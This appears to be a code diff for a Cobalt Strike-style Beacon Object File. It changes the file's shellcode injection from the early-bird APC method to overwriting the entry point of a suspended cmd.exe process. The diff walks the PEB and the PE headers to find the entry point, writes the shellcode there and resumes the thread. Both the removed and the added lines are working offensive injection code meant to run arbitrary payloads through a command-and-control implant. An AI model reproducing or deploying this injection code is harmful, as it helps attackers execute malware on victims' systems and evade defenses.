@@ -15,54 +15,65 @@ void inject(const CHAR* shellcode, SIZE_T shellcodeSize) {
 
     PROCESS_INFORMATION pi = { 0 };
 
-    wchar_t cmdLine[] = L"C:\\Windows\\System32\\cmd.exe";
-    BOOL createProcessRes = KERNEL32$CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, L"C:\\Windows\\System32", &si, &pi);
-    if (createProcessRes == 0) {
-        DWORD err = KERNEL32$GetLastError();
-        BeaconPrintf(CALLBACK_OUTPUT, "failed to create process: %lu\n", err);
-        return;
-    }
-    BeaconPrintf(CALLBACK_OUTPUT, "process created: %p\n", pi.hProcess);
+    // spawn process in suspended state
+    KERNEL32$CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,L"C:\\Windows\\System32",&si,&pi);
+    HANDLE hProcess = pi.hProcess;
+    HANDLE hThread = pi.hThread;
+    BeaconPrintf(CALLBACK_OUTPUT, "hProcess: %p\n", hProcess);
+    BeaconPrintf(CALLBACK_OUTPUT, "hThread: %p\n", hThread);
 
-    LPVOID allocatedMemory = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (allocatedMemory == 0) {
-        DWORD err = KERNEL32$GetLastError();
-        BeaconPrintf(CALLBACK_OUTPUT, "failed to allocate memory: %lu\n", err);
-        return;
-    }
-    BeaconPrintf(CALLBACK_OUTPUT, "memory allocated: %p\n", allocatedMemory);
+    PROCESS_BASIC_INFORMATION pbi = { 0 };
+    ULONG returnLength = 0;
 
+    // get the process basic information to find the PEB later
+    NTSTATUS status = NTDLL$NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "pbi.PebBaseAddress: %p\n", pbi.PebBaseAddress);
+
+    // image base address is at PEB + 0x10  (x64)
+    LPVOID lpBaseAddress = (LPVOID)((ULONG_PTR)(pbi.PebBaseAddress) + 0x10);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "lpBaseAddress: %p\n", lpBaseAddress);
+
+    // read base address
+    LPVOID baseAddress = NULL;
+    SIZE_T bytesRead = 0;
+    BOOL readProcessMemoryRes = KERNEL32$ReadProcessMemory(hProcess, lpBaseAddress, &baseAddress, 8, &bytesRead);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "baseAddress: %p\n", baseAddress);
+
+    //read DOS header
+    IMAGE_DOS_HEADER dosHeader = { 0 };
+    BOOL readDosHeaderRes = KERNEL32$ReadProcessMemory(hProcess, baseAddress, &dosHeader, sizeof(dosHeader), &bytesRead);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "dosHeader.e_lfanew: %d\n", dosHeader.e_lfanew);
+
+    // use e_lfanew to find the NT header
+    LPVOID ntHeaderAddress = (LPVOID)((ULONG_PTR)(baseAddress) + dosHeader.e_lfanew);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "ntHeaderAddress: %p\n", ntHeaderAddress);
+
+    //read NT header
+    IMAGE_NT_HEADERS ntHeaders = { 0 };
+    BOOL readNtHeadersRes = KERNEL32$ReadProcessMemory(hProcess, ntHeaderAddress, &ntHeaders, sizeof(ntHeaders), &bytesRead);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "ntHeaders.OptionalHeader.AddressOfEntryPoint: %d\n", ntHeaders.OptionalHeader.AddressOfEntryPoint);
+
+    // calc entrypoint address
+    LPVOID entrypointAddress = (LPVOID)((ULONG_PTR)(baseAddress) + ntHeaders.OptionalHeader.AddressOfEntryPoint);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "entrypointAddress: %p\n", entrypointAddress);
+
+    // write shellcode to entrypoint address, overwrite PE
     SIZE_T bytesWritten = 0;
-    BOOL writeProcessMemoryRes = KERNEL32$WriteProcessMemory(pi.hProcess, allocatedMemory, shellcode, shellcodeSize, &bytesWritten);
-    if (writeProcessMemoryRes == 0) {
-        DWORD err = KERNEL32$GetLastError();
-        BeaconPrintf(CALLBACK_OUTPUT, "failed to write process memory: %lu\n", err);
-        return;
-    }
-    BeaconPrintf(CALLBACK_OUTPUT, "process memory written: %lu\n", bytesWritten);
+    BOOL writeProcessMemoryRes = KERNEL32$WriteProcessMemory(hProcess, entrypointAddress, shellcode, shellcodeSize, &bytesWritten);
 
-    DWORD oldProtect = 0;
-    BOOL virtualProtectExRes = KERNEL32$VirtualProtectEx(pi.hProcess, allocatedMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
-    if (virtualProtectExRes == 0) {
-        DWORD err = KERNEL32$GetLastError();
-        BeaconPrintf(CALLBACK_OUTPUT, "failed to change memory protection: %lu\n", err);
-        return;
-    }
-    BeaconPrintf(CALLBACK_OUTPUT, "memory protection changed to RX: %lu\n", oldProtect);
+    BeaconPrintf(CALLBACK_OUTPUT, "bytesWritten: %d\n", bytesWritten);
+    BeaconPrintf(CALLBACK_OUTPUT, "writeProcessMemoryRes: %d\n", writeProcessMemoryRes);
+    // resume thread
+    BOOL resumeThreadRes = KERNEL32$ResumeThread(hThread);
 
-    DWORD QueueUserAPCRes = KERNEL32$QueueUserAPC((PAPCFUNC)allocatedMemory, pi.hThread, 0);
-    if (QueueUserAPCRes == 0) {
-        DWORD err = KERNEL32$GetLastError();
-        BeaconPrintf(CALLBACK_OUTPUT, "failed to queue user APC: %lu\n", err);
-        return;
-    }
-    BeaconPrintf(CALLBACK_OUTPUT, "user APC queued: %lu\n", QueueUserAPCRes);
-
-    KERNEL32$ResumeThread(pi.hThread);
-    BeaconPrintf(CALLBACK_OUTPUT, "process resumed: %lu\n", pi.dwProcessId);
-
-    KERNEL32$CloseHandle(pi.hProcess);
-    KERNEL32$CloseHandle(pi.hThread);    
+    BeaconPrintf(CALLBACK_OUTPUT, "resumeThreadRes: %d\n", resumeThreadRes);
     return;
 }
 
@@ -80,7 +91,6 @@ VOID go(
     int shellcodeSizeInt = 0;
     CHAR* shellcode = BeaconDataExtract(&parser, &shellcodeSizeInt);
     SIZE_T shellcodeSize = (SIZE_T)shellcodeSizeInt;
-
 
     if (!bofstart())
     {
